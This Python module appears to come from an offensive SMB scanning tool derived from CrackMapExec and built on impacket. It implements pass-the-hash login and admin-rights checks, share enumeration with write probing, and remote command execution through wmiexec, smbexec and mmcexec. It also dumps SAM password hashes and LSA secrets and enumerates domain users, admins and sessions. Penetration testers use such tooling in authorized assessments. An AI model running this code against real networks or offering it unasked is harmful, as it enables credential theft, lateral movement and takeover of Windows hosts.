import os.path
from time import sleep
import socket
import traceback
import struct
import ntpath

import impacket
from impacket.smbconnection import SessionError, SMBConnection
from impacket.nmb import NetBIOSTimeout, NetBIOSError
from impacket.smb import SMB_DIALECT
from impacket.smb3structs import SMB2_DIALECT_21
from impacket.dcerpc.v5 import transport, scmr
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.examples.secretsdump import RemoteOperations, SAMHashes, LSASecrets

from .exec.smbexec import SMBEXEC
from .exec.wmiexec import WMIEXEC
from .exec.mmcexec import MMCEXEC
from .enum import Enum
from utils.output import Output
from utils.utils import AuthFailure, sizeof_fmt, gen_random_string

"""
Lot of code here taken from CME, @byt3bl33d3r did an awesome job with impacket
"""

class SMBScan:

    def __init__(self, hostname, port, timeout):
        self.hostname = hostname
        self.port = port
        self.timeout = timeout

        self.conn = None
        self.authenticated = False
        self.smbv1 = None
        self.creds = None
        self.is_admin = False

        self.remote_ops = None
        self.bootkey = None

    def url(self, path=None):
        if path:
            return "smb://%s:%d%s" % (self.hostname, self.port, path)
        else:
            return "smb://%s:%d" % (self.hostname, self.port)

    def auth(self, domain='WORKGROUP', username=None, password=None, hash=None):
        if not self.conn:
            Output.write({'target': self.url(), 'message': 'enum_host_info(): please connect first'})

        self.local_ip = self.conn.getSMBServer().get_socket().getsockname()[0]

        success = False
        is_admin = False

        try:
            if username == None:
                self.conn.login('' , '')
                self.is_admin = self.check_if_admin(domain, '', '', hash)
                self.creds = {'username': '', 'password': '', 'domain': domain}
            else:
                if password != None:
                    self.conn.login(username, password, domain)
                    self.creds = {'username': username, 'password': password, 'domain': domain}
                elif hash != None:
                    if not ':' in hash:
                        nt_hash = hash
                        lm_hash = 'aad3b435b51404eeaad3b435b51404ee'
                    else:
                        nt_hash = hash.split(':')[1]
                        lm_hash = hash.split(':')[0]

                    print(nt_hash)
                    print(lm_hash)

                    self.conn.login(username, '', domain, lm_hash, nt_hash)
                    self.creds = {'username': username, 'hash': hash, 'domain': domain}

                self.is_admin = self.check_if_admin(domain, username, password, hash)

            success = True

        except impacket.smbconnection.SessionError as e:
            error, desc = e.getErrorString()
            raise AuthFailure(error)
        except Exception as e:
            Output.write({'target': self.url(), 'message': "%s:%s\n%s" % (type(e), str(e), traceback.format_exc())})
            pass

        self.authenticated = success

        return success, self.is_admin

    def get_server_info(self):
        if not self.conn:
            self.conn()
        if not self.authenticated:
            try:
                self.auth()
            except AuthFailure:
                pass

        domain    = self.conn.getServerDNSDomainName()
        hostname  = self.conn.getServerName()
        try:
            server_os = str(self.conn._SMBConnection.get_server_lanman())
        except:
            server_os = str(self.conn.getServerOS())
        signing   = self.conn.isSigningRequired() if self.smbv1 else self.conn._SMBConnection._Connection['RequireSigning']

        if not domain:
            domain = hostname

        smb_info = {}
        if domain:
            smb_info['domain'] = domain
        if hostname:
            smb_info['hostname'] = hostname
        if server_os:
            smb_info['server_os'] = server_os
        if signing:
            smb_info['signing'] = signing

        return smb_info


    def connect(self):
        try:
            self.conn = SMBConnection(self.hostname, self.hostname, None, self.port, timeout=self.timeout, preferredDialect=SMB_DIALECT)
            self.smbv1 = True

            return True
        except (NetBIOSError, socket.error, struct.error, ConnectionResetError, TypeError) as e:
            try:
                self.conn = SMBConnection(self.hostname, self.hostname, None, timeout=self.timeout, preferredDialect=SMB2_DIALECT_21)
                self.smbv1 = False

                return True
            except socket.error as e:
                return False
            except Exception as e:
                return False
        except Exception as e:
            Output.write({'target': self.url(), 'message': "%s:%s\n%s" % (type(e), str(e), traceback.format_exc())})
            return False

    def disconnect(self):
        if self.conn:
            try:
                '''
                    DC's seem to want us to logoff first, windows workstations sometimes reset the connection
                    (go home Windows, you're drunk)
                '''
                self.conn.logoff()
            except:
                pass

            self.smbv1 = None
            self.authenticated = False
            self.conn = None
            self.creds = None
            self.is_admin = False

            self.remote_ops = None
            self.bootkey = None

    def check_if_admin(self, domain='WORKGROUP', username='', password=None, hash=None):
        admin_privs = False

        stringBinding = r'ncacn_np:{}[\pipe\svcctl]'.format(self.hostname)

        rpctransport = transport.DCERPCTransportFactory(stringBinding)
        rpctransport.set_dport(self.port)

        lmhash = ''
        nthash = ''
        if hash:
            lmhash, nthash = hash.split(':')
        if hasattr(rpctransport, 'set_credentials'):
            # This method exists only for selected protocol sequences.
            rpctransport.set_credentials(username, password if password is not None else '', domain, lmhash, nthash)
        dce = rpctransport.get_dce_rpc()
        dce.connect()
        dce.bind(scmr.MSRPC_UUID_SCMR)

        lpMachineName = '{}\x00'.format(self.hostname)
        try:

            # 0xF003F - SC_MANAGER_ALL_ACCESS
            # http://msdn.microsoft.com/en-us/library/windows/desktop/ms685981(v=vs.85).aspx

            resp = scmr.hROpenSCManagerW(dce, lpMachineName, 'ServicesActive\x00', 0xF003F)
            admin_privs = True
        except DCERPCException:
            pass

        return admin_privs

    def list_shares(self):
        temp_dir = ntpath.normpath("\\" + gen_random_string())

        try:
            for share in self.conn.listShares():
                share_name = share['shi1_netname'][:-1]
                share_remark = share['shi1_remark'][:-1]
                share_info = {'name': share_name, 'remark': share_remark, 'access': []}
                read = False
                write = False

                try:
                    self.conn.listPath(share_name, '*')
                    read = True
                    share_info['access'].append('READ')
                except SessionError:
                    pass

                try:
                    self.conn.createDirectory(share_name, temp_dir)
                    self.conn.deleteDirectory(share_name, temp_dir)
                    write = True
                    share_info['access'].append('WRITE')
                except SessionError:
                    pass

                yield share_info

        except Exception as e:
            Output.write({'target': self.url(), 'message': "%s:%s\n%s" % (type(e), str(e), traceback.format_exc())})

    def list_dir(self, share, path):
        contents = self.conn.listPath(share, '*')

    def list_content(self, path="\\", share=None, recurse=3):
        if not share:
            return
        try:
            has_content = False

            try:
                contents = self.conn.listPath(share, path+"\\*")
            except SessionError as e:
                if 'STATUS_ACCESS_DENIED' not in str(e):
                    Output.write({'target': self.url(), 'message': "Failed listing files on share {} in directory {}: {}".format(share, path, e)})
                return

            for content in contents:
                has_content = True

                filename = content.get_longname()
                if path.endswith('\\'):
                    filepath = "%s%s" % (path, filename)
                else:
                    filepath = "%s\\%s" % (path, filename)
                is_readonly = content.is_readonly()
                is_directory = content.is_directory()

                if filename in ['.', '..']:
                    continue

                if not is_directory:
                    size = content.get_filesize()
                    yield {'type': 'file', 'name': filepath, 'size': size}
                else:
                    if not filepath.endswith('\\'):
                        filepath = "%s\\" % filepath

                    if recurse <= 0:
                        yield {'type': 'folder', 'name': filepath}
                    else:
                        for data in self.list_content(path=filepath, share=share, recurse=recurse-1):
                            yield data

            if not has_content and path != '\\':
                yield {'type': 'folder', 'name': path}
        except Exception as e:
            Output.write({'target': self.url(), 'message': "%s:%s\n%s" % (type(e), str(e), traceback.format_exc())})

    def exec(self, command, exec_method=None, get_output=True):

        if not exec_method:
            exec_methods = ['wmiexec', 'smbexec', 'mmcexec']
        else:
            exec_methods = [exec_method]

        smb_share = "C$"
        domain = self.creds['domain'] if 'domain' in self.creds else 'WORKGROUP'
        username = self.creds['username'] if 'username' in self.creds else ''
        password = self.creds['password'] if 'password' in self.creds else ''
        hash = self.creds['hash'] if 'hash' in self.creds else ''
        # I don't support kerberos yet

        output = None
        exec = None

        for method in exec_methods:
            if method == 'wmiexec':
                try:
                    exec = WMIEXEC(self.hostname, username, password, domain, self.conn, hash, smb_share)
                    break
                except:
                    Output.write({'target': self.url(), 'message': "Error execution command via wmiexec:\n%s" % traceback.format_exc()})
                    continue
            elif method == 'smbexec':
                try:
                    exec = SMBEXEC(self.hostname, username, password, domain, hash, smb_share)
                    break
                except:
                    Output.write({'target': self.url(), 'message': "Error execution command via smbexec:\n%s" % traceback.format_exc()})
                    continue
            elif method == 'mmcexec':
                try:
                    exec = MMCEXEC(self.hostname, username, password, domain, self.conn, hash, smb_share)
                    break
                except:
                    Output.write({'target': self.url(), 'message': "Error execution command via smbexec:\n%s" % traceback.format_exc()})
                    continue
            else:
                Output.write({'target': self.url(), 'message': "Unknown execution method: %s" % method})

        if exec == None:
            return None

        output = exec.execute(command, get_output)
        if output == None:
            return None
        return output

    def enable_remoteops(self):
        if self.remote_ops is not None and self.bootkey is not None:
            return

        try:
            self.remote_ops  = RemoteOperations(self.conn, False, None) #self.__doKerberos, self.__kdcHost
            self.remote_ops.enableRegistry()
            self.bootkey = self.remote_ops.getBootKey()
        except Exception as e:
            self.logger.error('RemoteOperations failed: {}'.format(e))

    def dump_sam(self):
        self.enable_remoteops()

        sam_entries = []
        def new_sam_hash(sam_hash):
            username,_,lmhash,nthash,_,_,_ = sam_hash.split(':')
            sam_entries.append({'username': username, 'hash': ':'.join((lmhash, nthash))})

        if self.remote_ops and self.bootkey:
            SAMFileName = self.remote_ops.saveSAM()
            SAM = SAMHashes(SAMFileName, self.bootkey, isRemote=True, perSecretCallback=lambda secret: new_sam_hash(secret))

            SAM.dump()

            try:
                self.remote_ops.finish()
            except Exception as e:
                print("Error calling remote_ops.finish(): {}".format(e))

            self.remote_ops = None
            self.bootkey = None

            SAM.finish()

        return sam_entries

    def dump_lsa(self):
        self.enable_remoteops()

        lsa_entries = []
        def new_lsa_secret(secret):
            lsa_entries.append({'secret': secret})

        if self.remote_ops and self.bootkey:

            SECURITYFileName = self.remote_ops.saveSECURITY()

            LSA = LSASecrets(SECURITYFileName, self.bootkey, self.remote_ops, isRemote=True,
                             perSecretCallback=lambda secretType, secret: new_lsa_secret(secret))

            LSA.dumpCachedHashes()
            LSA.dumpSecrets()

            try:
                self.remote_ops.finish()
            except Exception as e:
                print("Error calling remote_ops.finish(): {}".format(e))

            self.remote_ops = None
            self.bootkey = None

            LSA.finish()

        return lsa_entries

    def enum_users(self):
        if self.conn == None:
            return
        if self.creds == None:
            return

        username = self.creds['username'] if 'username' in self.creds else ''
        domain = self.creds['domain'] if 'domain' in self.creds else 'WORKGROUP'
        password = self.creds['password'] if 'password' in self.creds else ''
        hash = self.creds['hash'] if 'hash' in self.creds else ''

        enum = Enum(self.hostname, self.port, domain, username, password, hash, self.conn)

        for user in enum.enumUsers():
            yield user

    def enum_groups(self):
        if self.conn == None:
            return
        if self.creds == None:
            return

        username = self.creds['username'] if 'username' in self.creds else ''
        domain = self.creds['domain'] if 'domain' in self.creds else 'WORKGROUP'
        password = self.creds['password'] if 'password' in self.creds else ''
        hash = self.creds['hash'] if 'hash' in self.creds else ''

        enum = Enum(self.hostname, self.port, domain, username, password, hash, self.conn)

        for group in enum.enumGroups():
            yield group

    def enum_admins(self):
        if self.conn == None:
            return
        if self.creds == None:
            return

        username = self.creds['username'] if 'username' in self.creds else ''
        domain = self.creds['domain'] if 'domain' in self.creds else 'WORKGROUP'
        password = self.creds['password'] if 'password' in self.creds else ''
        hash = self.creds['hash'] if 'hash' in self.creds else ''

        enum = Enum(self.hostname, self.port, domain, username, password, hash, self.conn)

        for user in enum.enumAdmins():
            yield user

    def enum_password_policy(self):
        if self.conn == None:
            return
        if self.creds == None:
            return

        username = self.creds['username'] if 'username' in self.creds else ''
        domain = self.creds['domain'] if 'domain' in self.creds else 'WORKGROUP'
        password = self.creds['password'] if 'password' in self.creds else ''
        hash = self.creds['hash'] if 'hash' in self.creds else ''

        enum = Enum(self.hostname, self.port, domain, username, password, hash, self.conn)

        return enum.enumPasswordPolicy()

    def enum_loggedin(self):
        if self.conn == None:
            return
        if self.creds == None:
            return

        username = self.creds['username'] if 'username' in self.creds else ''
        domain = self.creds['domain'] if 'domain' in self.creds else 'WORKGROUP'
        password = self.creds['password'] if 'password' in self.creds else ''
        hash = self.creds['hash'] if 'hash' in self.creds else ''

        enum = Enum(self.hostname, self.port, domain, username, password, hash, self.conn)

        for logged in enum.enumLoggedIn():
            yield logged

    def enum_sessions(self):
        if self.conn == None:
            return
        if self.creds == None:
            return

        username = self.creds['username'] if 'username' in self.creds else ''
        domain = self.creds['domain'] if 'domain' in self.creds else 'WORKGROUP'
        password = self.creds['password'] if 'password' in self.creds else ''
        hash = self.creds['hash'] if 'hash' in self.creds else ''

        enum = Enum(self.hostname, self.port, domain, username, password, hash, self.conn)

        for session in enum.enumSessions():
            yield session

